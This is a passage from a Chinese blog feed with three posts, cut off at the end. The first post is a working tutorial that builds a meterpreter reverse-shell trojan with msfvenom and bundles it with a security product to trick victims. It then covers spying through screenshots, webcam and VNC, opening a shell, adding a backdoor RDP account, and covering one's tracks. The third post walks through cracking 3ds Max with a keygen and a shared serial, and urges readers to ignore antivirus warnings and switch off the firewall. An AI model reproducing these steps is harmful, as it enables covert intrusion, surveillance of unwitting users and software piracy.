    <content type="html"><![CDATA[<blockquote><p>写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。</p></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>入侵机器：Kali Linux 2019.4 64位<br>肉鸡：Windows 7 64位</p><a id="more"></a><h2 id="本机IP"><a href="#本机IP" class="headerlink" title="本机IP"></a>本机IP</h2><p>首先我们来看一下入侵机器的IP地址.<br>终端输入：ifconfig</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/1.png"><ul><li>图中红色方框内就是我们的入侵机器的IP了，下面会用到。</li></ul><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>终端输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.140 LPORT=4444 -f exe -o God.exe</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/2.png"><p>参数解释：</p><ul><li><p>-p:指定payload</p></li><li><p>LHOST:本机IP （这里入侵机器的IP为：”192.168.211.140”，根据使用ifconfig命令得出的IP地址自行更改）</p></li><li><p>LPORT:指定监听端口  (这里指定的监听端口为：4444)</p></li><li><p>-f:指定文件类型</p></li><li><p>-o:指定输出的木马文件名  (这里木马名叫做God，可随意更改)</p></li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/3.png"><ul><li>命令执行完毕后我们root目录下会生成一个名为God的exe程序文件，可想而知，这个便就是我们的木马文件了。</li></ul><h2 id="msfconsole监听"><a href="#msfconsole监听" class="headerlink" title="msfconsole监听"></a>msfconsole监听</h2><ol><li><p>终端输入：msfconsole</p></li><li><p>使用监听模块：use exploit/multi/handler</p></li><li><p>设置payload：set payload windows/meterpreter/reverse_tcp</p></li><li><p>设置入侵机kali linux的IP地址：set lhost 192.168.96.128 （ip要与生成木马时的ip一致）</p></li><li><p>设置监听端口：set lport 4444 (端口要与生成木马时的端口一致）</p></li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/4.png"><ol start="6"><li>开始监听：exploit</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/5.png"><h2 id="肉鸡安装木马"><a href="#肉鸡安装木马" class="headerlink" title="肉鸡安装木马"></a>肉鸡安装木马</h2><ul><li>把刚刚生成的木马文件放到我们的肉鸡当中，可以使用捆绑软件将木马文件和我们的正常程序文件捆绑在一起，下面我们把刚刚生成的木马文件和360安全卫士捆绑在一起，因为没有做免杀360安全卫士报毒了，需要免杀的大神可自行研究。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/6.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/7.png"><ul><li>如果肉鸡是普通用户的电脑并且没有安装杀毒软件或是忽略了杀毒软件的提示的话，点开了被我们木马感染的应用程序，运行了正常应用程序的同时也运行了我们的木马文件，在不知不觉间就成为了我们的囊中之物。</li></ul><h2 id="控制肉鸡"><a href="#控制肉鸡" class="headerlink" title="控制肉鸡"></a>控制肉鸡</h2><p>如果肉鸡成功的运行了我们的木马文件并且我们入侵机Kali Linux在监听状态下的话，入侵机就会产生一个meterpreter会话，参考下图</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/8.png"><p>这时我们就可以对肉鸡进行控制了</p><ol><li>终端输入 sysinfo 可以获取到肉鸡的基本信息</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/9.png"><ol start="2"><li>终端输入 screenshot 可以获取到肉鸡屏幕的截图，截图默认保存在root文件夹当中</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/10.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/11.png"><ol start="3"><li>终端输入 webcam_list 可以查看肉鸡有几个摄像头，如果肉鸡有摄像头的话终端输入 webcam_stream 可以获取到肉鸡摄像头视频</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/12.png"><ul><li>由于这里的肉鸡是windons 7，没有摄像头，所以这里无法演示。</li></ul><p> 4.终端输入 dir 可以查看肉鸡上的文件</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/13.png"><ul><li>因为木马程序的位置是在桌面，所以获取到了桌面下的所有文件。</li></ul><p> 5.我们可以在肉鸡上启动某个程序，命令为 execute ，比如启动肉鸡上的计算器，终端输入 execute -f calc.exe ，回到肉鸡中，计算器已被启动</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/14.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/15.png"><p> 6.终端输入 run vnc 可查看肉鸡的实时屏幕，并且被监视的肉鸡本身并不会发生任何变化，不知不觉间就被我们监视了</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/16.png"><p> 7.终端输入 shell 可以进入肉鸡的命令行，这里你可在对方的电脑上执行一些cmd命令，当然，我们的一系列操作普通用户是看不到的，命令行输入 ipconfig 查看一下肉鸡的IP，下面会用到。</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/17.png"><p> 8.终端输入 ps 可以看到肉鸡当前正在运行的程序，你可以用 run post/windows/manage/migrate 将进程迁移到其他程序，也可以将其他程序关闭</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/18.png"><p> 9.进入肉鸡的远程桌面，实现远程控制，首先开启肉鸡的3389远程桌面，终端输入 run getgui -e 即可开启</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/19.png"><p> 10.成功开启了肉鸡的3389远程桌面后我们在肉鸡上新建一个用来登陆远程桌面的帐户，终端输入 run getgui -u God -p 123456</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/20.png"><ul><li>这里新建了一个用户名为 God ，密码为 123456 的帐户</li></ul><p> 11.我们新建一个终端窗口，终端输入 rdesktop -u God -p 123456 192.168.211.132:3389 登录肉鸡远程桌面。命令中的God为刚刚创建的登录用户名，123456为刚刚创建的登录密码，192.168.96.129为肉鸡的IP地址，根据自己创建的帐户和肉鸡的IP自行更改</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/21.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/22.png"><p>这个时候就可以像操作自己电脑一样操控肉鸡，你可以利用他做任何你想要做事情，如果做什么特殊的事情切记要记得清理一下入侵痕迹并且做好防御防止自己被反追踪，具体如何防御我就不细说了，这里只讲入侵，其余的请自行百度解决。</p><p> 12.终端输入输入 shutdown 可以强制将肉鸡电脑关机</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/23.png"><ul><li>回到肉鸡中可以看到肉鸡关机了</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/24.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>metasploit这个渗透框架功能十分强大，这里只讲述了部分常用功能，更多的功能你们可以自行尝试。</li><li>这里不足之处就是这个木马不能免杀，安装有腾讯安全卫士或者360安全卫士的电脑能立马查杀出来。当然还有其他的免杀方式，或者也可以用powershell来达到免杀效果，杀毒软件一般是无法查杀的。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h2&gt;&lt;p&gt;入侵机器：Kali Linux 2019.4 64位&lt;br&gt;肉鸡：Windows 7 64位&lt;/p&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>应用Service worker加快/离线访问博客</title>
    <link href="https://lovek.me/av6/"/>
    <id>https://lovek.me/av6/</id>
    <published>2019-12-01T11:23:00.000Z</published>
    <updated>2020-03-14T16:39:56.173Z</updated>
    
    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/2.png"><p>有一个困扰 web 用户多年的难题——丢失网络连接。即使是世界上最好的 web app，如果下载不了它，也是非常糟糕的体验。如今虽然已经有很多种技术去尝试着解决这一问题。而随着<strong>离线页面</strong>的出现，一些问题已经得到了解决。有一个叫做 APP Cache 的 API 可以提供离线体验，但它的问题比较多。最重要的问题是，仍然没有一个好的统筹机制对资源缓存和自定义的网络请求进行控制。</p><a id="more"></a><h2 id="Service-worker"><a href="#Service-worker" class="headerlink" title="Service worker"></a>Service worker</h2><p>于是 HTML5 提出了 Service Worker，Service worker 提供了很多新的能力，使得 web app 拥有与 nativeapp 相同的离线体验、消息推送体验。</p><p>Service worker 是一段脚本，它有能力往我们的浏览器中写入缓存，过滤网络请求，将缓存内容作为网络响应结果输出。<br><strong>带来的效果是显而易见的：</strong></p><blockquote><p>1、当我们缓存了某些资源的时候，当我们再次请求该资源的时候，我们便可以使用缓存的内容，这样的话，就可以减少网络请求了，网站的打开速度明显提升。<br>2、如果我们将网站所需的资源缓存下来了以后，这个时候即使计算机没有网络，依然可以打开这个网站，即离线访问。</p></blockquote><h2 id="Service-worker-应用场景"><a href="#Service-worker-应用场景" class="headerlink" title="Service worker 应用场景"></a>Service worker 应用场景</h2><p>现在很流行基于 GitHub page 和 markdown 的静态 blog ，非常适合技术的思维和习惯，针对不同的语言都有一些优秀的静态 blog 系统出现，如 Jekyll/Ruby，Pelican/Python，Hexo/NodeJs ，由于静态内容的特性非常适合做缓存来加速页面的访问，就利用 Service worker 来实现加速，结果是除了 PageSpeed，CDN 这些常见的服务器和网络加速之外，通过客户端实现了更好的访问体验。</p><p>现在你可以试试<strong>剪断网线</strong>刷新一下这个可爱的博客。或者浏览器快捷键F12—&gt;点击Network—&gt;勾选offline（断网）刷新页面</p><h2 id="应用技巧"><a href="#应用技巧" class="headerlink" title="应用技巧"></a>应用技巧</h2><p><strong>注册 Service worker</strong><br>要安装 Service worker，你需要在你的页面上注册它。下面的代码会告诉浏览器你的 Service worker 脚本放在哪里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">if</span> (navigator.serviceWorker) &#123;</span><br><span class="line">    <span class="comment">// 注册Service Worker scope表示作用的页面的path</span></span><br><span class="line">    <span class="comment">// register函数返回Promise</span></span><br><span class="line">    navigator.serviceWorker.register(<span class="string">'/service-worker.js'</span>,&#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;) </span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span> (<span class="params">registration</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(registration);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(e);</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Service Worker is not supported in this browser.'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码会先检测 Service worker 在浏览器中是否可用，可用的话一个 Service worker（/service-worker.js）将被注册，如果这个 Service worker 已经注册过了，浏览器这会忽略以上代码。<br><strong>{scope: ‘/‘}</strong> 表示 Service worker 作用的范围。<br>需要说明的是 service-worker.js 文件被放在这个域的根目录下，这意味着 service worker 是跟网站同源的。换句话说，这个 service worker 将会获取到这个域下的所有 fetch 事件。<br>如果 service worker 文件注册到 /example/service-worker.js ，那么 service worker 只能收到 /example/ 路径下的 fetch 事件（比如： /example/page1/, /example/page2/）。<br>如果 service worker 文件注册到根目录下 /service-worker.js ，同时 {scope: ‘/example’} ，那么 service worker 也只能收到 /example/ 路径下的 fetch 事件。</p><p>service-worker.js 文件，我建议是放在网站的跟目录下，scope 不作修改，这样 service worker 拥有最大的使用范围。</p><h2 id="安装-Service-worker"><a href="#安装-Service-worker" class="headerlink" title="安装 Service worker"></a>安装 Service worker</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/1.png"><p>关于这个 service-worker.js 怎么写，具体可以查看 API,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">MDN Service Worker API</a>。</p><blockquote><p>注意：将 service-worker.js 放到域的根目录下哦，这样 Service worker 才能拥有最大的使用范围。</p></blockquote><p>现在你可以到 chrome://inspect/#service-workers 这里，检查 service worker 是否对你的网站启用了。<br>或者在 chrome://serviceworker-internals/ 中管理你的 Service worker 。<br>或者在浏览器的开发者工具中也可以详细的查看 service worker 的缓存。</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/2.png"><h2 id="Service-worker-核心-API"><a href="#Service-worker-核心-API" class="headerlink" title="Service worker 核心 API"></a>Service worker 核心 API</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/3.png"><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/4.png"><p>install 是安装一个 service worker 缓存，使用方法可以是这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the callback for the install step</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Perform install steps</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 install 的 callback 中，我们需要执行一下步骤：<br>1、开启一个缓存<br>2、缓存我们的文件<br>3、确定所有的资源是否要被缓存</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h2><p>fetch 用来监听用户的网络请求，并给出回应。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request)</span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Cache hit - return response</span></span><br><span class="line">        <span class="keyword">if</span> (response) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fetch(event.request);</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="activate"><a href="#activate" class="headerlink" title="activate"></a>activate</h2><p>你的 Service worker 总会有要更新的时候。在那时，你需要按照一下步骤来更新：<br>1、更新你 service worker 的 JavaScript 文件。<br>2、更新后的 service worker 启动并触发 install 事件。<br>3、此时，当前页面生效的依然是老版本的 service worker ，新的 service worker 会进入“waitting”状态。<br>4、当页面关闭后，来的 service worker 会被干掉，新的 service worker 接管页面。<br>5、一旦新的 service worker 生效后会触发 active 事件。</p><p>一个典型的 activete 事件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123; </span><br><span class="line"><span class="comment">// 监听worker的activate事件</span></span><br><span class="line">  event.waitUntil( <span class="comment">// 延迟activate事件直到</span></span><br><span class="line">    caches.keys().then(<span class="function"><span class="keyword">function</span>(<span class="params">keys</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(keys.map(<span class="function"><span class="keyword">function</span>(<span class="params">key, i</span>)</span>&#123; <span class="comment">// 清除旧版本缓存</span></span><br><span class="line">        <span class="keyword">if</span>(key !== CACHE_VERSION)&#123;</span><br><span class="line">          <span class="keyword">return</span> caches.delete(keys[i]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;)</span><br><span class="line">  )</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="其他使用场景"><a href="#其他使用场景" class="headerlink" title="其他使用场景"></a>其他使用场景</h2><p>在网站 A 中，隐藏一个 iframe ，在这个 iframe 中注册一个 service worker ，这个 service worker 会缓存网站 B 所需的资源。<br>从未访问过网站 B，但网站已经在你的设备上预加载过了，一切仅仅因为你访问过网站 A。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://B.com/iframe.html"</span> <span class="attr">style</span>=<span class="string">"width: 0; height: 0; border: 0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML5 For Web Designers<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</span></span><br><span class="line"><span class="actionscript">  navigator.serviceWorker.register(<span class="string">'/serviceworker.js'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/2.png&quot;&gt;

&lt;p&gt;有一个困扰 web 用户多年的难题——丢失网络连接。即使是世界上最好的 web app，如果下载不了它，也是非常糟糕的体验。如今虽然已经有很多种技术去尝试着解决这一问题。而随着&lt;strong&gt;离线页面&lt;/strong&gt;的出现，一些问题已经得到了解决。有一个叫做 APP Cache 的 API 可以提供离线体验，但它的问题比较多。最重要的问题是，仍然没有一个好的统筹机制对资源缓存和自定义的网络请求进行控制。&lt;/p&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>3D Max安装</title>
    <link href="https://lovek.me/av5/"/>
    <id>https://lovek.me/av5/</id>
    <published>2019-11-23T12:33:00.000Z</published>
    <updated>2020-09-27T08:40:40.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需要资源："><a href="#需要资源：" class="headerlink" title="需要资源："></a>需要资源：</h2><ul><li><strong>3D Max安装包</strong></li><li><strong>3D Max注册机</strong></li><li><strong>VRay渲染器（3D 必装）</strong> </li><li><strong>VRay破解工具</strong></li><li><strong>VRay汉化工具</strong><blockquote><p>本篇文章以<strong>2018年版</strong>的<strong>3D Max</strong>和<strong>VRay 3.6</strong>为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。</p></blockquote></li></ul><a id="more"></a><ul><li>为了方便大家不用再去网上辛苦的找资源，本篇文章底部已附上所需软件的下载地址，只适用于64位操作系统，需要的可以前往下载。</li></ul><hr><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul><li>下载完成并解压之后得到<strong>3D Max 2018</strong>和<strong>VRay 3.6</strong>两个文件。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/1.jpg"><hr><h2 id="3D-Max-2018"><a href="#3D-Max-2018" class="headerlink" title="3D Max 2018"></a>3D Max 2018</h2><ul><li>首先我们先来安装3D Max 2018，吧3D Max解压到你的桌面上方便安装完成之后的整理。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/2.jpg"><ul><li>打开我们刚解压出来的文件夹，得到3D Max安装主程序文件夹和一个注册机文件夹，部分电脑会报毒属于正常，我们忽略掉就好。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/3.jpg"><ul><li>进入3D Max 2018文件夹里面有三个文件，我们先来安装一下3D Max的帮助，打开<strong>3Ds Max2018Help</strong>文件，记得要右键管理员身份运行，否则会报错。弹出图中窗口，点击那个<strong>Browse…</strong>来选择我们的安装路径，安装到你想要安装的磁盘，这里我安装到D盘。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/4.jpg"><ul><li>在需要安装的磁盘里面新建一个文件夹，将它命名为<strong>3D Max2018</strong>，选择它并确定</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/5.jpg"><ul><li>选择好路径之后我们点击<strong>Extract</strong>开始安装，安装过程大约需要1~3分钟.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/6.jpg"><ul><li>安装完3D Max2018Help之后我们来解压3Dmax安装主程序，两个一模一样的安装包，随便打开那个都可以，切记要右键管理员方式运行，弹出图中窗口，点击”<strong>更改</strong>“选择路径.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/7.jpg"><ul><li>在刚刚安装3D MaxHelp的那个磁盘里再新建一个文件夹，命名为<strong>3D Max</strong>安装程序，(只要自己待会能找到可以随便命名)，选择它并确定.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/8.jpg"><ul><li>选择好路径后点击确定就会开始解压，此过程大约需要4~8分钟.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/9.jpg"><ul><li>解压完成之后一般会自动弹出3D Max的安装页面.</li><li>如果没弹出请依次打开：此电脑 ➡ (你安装的磁盘) ➡ 3D Max安装程序(刚刚解压时新建的文件名称) ➡ Autodesk_3ds_Max_2018_EFGJKPS_Win_64bit_dlm ➡ setup(记得右键管理员运行)</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/10.jpg"><ul><li>选择”<strong>安装</strong>“，点击”<strong>我接受</strong>“然后下一步，进入配置页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/11.jpg"><ul><li>这里点击”<strong>浏览</strong>“来选择安装路径，选择刚刚安装3D MaxHelp的那个磁盘，找到第一次新建的那个文件夹，就是名为3D Max2018的那个文件夹，选择它并确定，路径选择好之后我们直接点击安装。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/12.jpg"><ul><li>程序会自动开始配置各种3D Max的文件，我这里是23个产品，安装的电脑不同安装的产品数量也不同，这里一般需要较长的时间，请<strong>不要中途取消</strong>，需要些耐心.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/13.jpg"><ul><li>安装成功之后出现下图，(如果之前电脑安装过3D Max可能会出现安装错误的情况，如果出现此类情况，这里不再详细讲解，请自行百度搜索错误原因)，不要点击立即启动，我们点击右上角的”<strong>X</strong>“号将这个窗口关掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/14.jpg"><ul><li>现在我们打开3D Max是英文状态，我们需要点击任务栏上面的win图标，从里面可以看到好多3D Max的图标，打开折叠，随便在一个3D Max的图标上右键➡更多➡打开文件位置.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/15.jpg"><ul><li>在弹出的文件夹里面找到名为<strong>3ds Max 2018 - Simplified Chinese</strong>的图标，把它拖到电脑桌面上去，删除桌面上原有的3D Max图标，吧刚刚从文件夹里面拖出来的那个图标右键重命名为<strong>3D Max 2018</strong>(或者选择它点击<strong>F2</strong>重命名也可以)，至此3D Max安装完成.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/16.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/17.jpg"><hr><h2 id="3D-Max破解"><a href="#3D-Max破解" class="headerlink" title="3D Max破解"></a>3D Max破解</h2><ul><li>打开注册机文件夹，把里面的注册机拖到桌面上，然后我们打开3D Max 2018.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/18.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/19.jpg"><ul><li>加载一会自动弹出下图激活窗口，我们选择输入序列号.(网上说这里要断网才能激活，经过测试这里并不需要断网，都是可以激活的)</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/20.jpg"><ul><li>这里点击激活按钮，不要点错了，如果点错了可以重新启动3D Max重新选择.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/21.jpg"><ul><li>这里填写序列号和产品密钥，分享大家一个序列号：<strong>666-69696969</strong> 产品密钥：<strong>128J1</strong>(序列号和产品密钥可多次使用，不用担心用不了，并且都是永久激活)</li><li>填写完整序列号和产品密钥之后我们点击下一步即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/22.jpg"><ul><li>注意！到了这一步我们就不要再操作了，在任务栏里面右键，选择任务管理器，把它打开，结束掉图中的两个程序。之后关掉任务管理器即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/23.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/24.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/25.jpg"><ul><li>我们再次打开3D Max，和之前一样，弹出激活界面，选择序列号，点击激活，输入之前的序列号和产品密钥之后点击下一步.</li><li>到这里我们可以发现选项变了，选择我拥有激活码.</li><li>这时我们打开桌面上的注册机<strong>(注册机需要右键管理员身份运行，不然会报错)</strong>，部分杀毒软件会报毒它，我们不用担心，它是安全的，我们忽略掉杀毒软件的提示就可以了，如果注册机打不开，就是电脑系统防火墙将他阻止掉了，我们进去Windows安全中心，把它设为允许运行或不阻止就可以了，当然，嫌麻烦也可以直接关掉防火墙。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/26.jpg"><ul><li>点击一下注册机上的<strong>Patch</strong>按钮，出现如下图窗口表示获取成功，弹出的窗口点击确定即可，如果出现其他类型的窗口表示获取失败，这种失败的情况往往是你没有让注册机以管理员身份运行所导致的.</li></ul><img 